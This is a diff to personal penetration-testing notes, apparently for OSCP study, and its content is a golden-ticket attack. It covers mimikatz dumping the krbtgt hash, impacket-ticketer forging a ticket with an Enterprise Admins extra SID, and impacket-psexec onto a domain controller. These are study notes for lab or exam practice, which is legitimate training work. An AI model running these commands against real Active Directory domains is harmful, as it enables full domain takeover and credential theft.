@@ -1742,7 +1742,7 @@ klist
     
 *** TODO DCOM
 *** TODO Golden ticket
-    #+begin_example
+#+begin_example
 
 .\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::lsa /inject /name:krbtgt" "exit" -> to gain krbgt hash in format -aes-key
 
@@ -1750,7 +1750,6 @@ impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad
 -domain-sid S-1-5-21-4168247447-1722543658-2110108262 \ -> domain-sid
 -domain sub.corp.yzx \
 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 \ -> mimikatz (lsadump::trust) administrator -extra-pac
-
 ```
 Then:
 impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 \
@@ -1758,19 +1757,21 @@ impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad
 -domain sub.corp.yzx \
 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 \
  administrator -extra-pac
-
+#+end_example
 Make sure to update your /etc/hosts file:
-
+#+begin_example
 192.168.XXX.161 dc01.corp.yzx corp.yzx
 192.168.XXX.162 dc02.corp.yzx sub.corp.yzx
-
+#+end_example
 	
 Then, export the ticket as you already did with export
-
+#+begin_example
+export KRB5CCNAME=$path_to_ticket.ccache
+#+end_example
 Lastly, try again with psexec:
-
+#+begin_example
 impacket-psexec 'sub.corp.yzx/administrator@dc01.corp.yzx' -k -no-pas
-    #+end_example
+#+end_example
     
 * Reporting
   https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
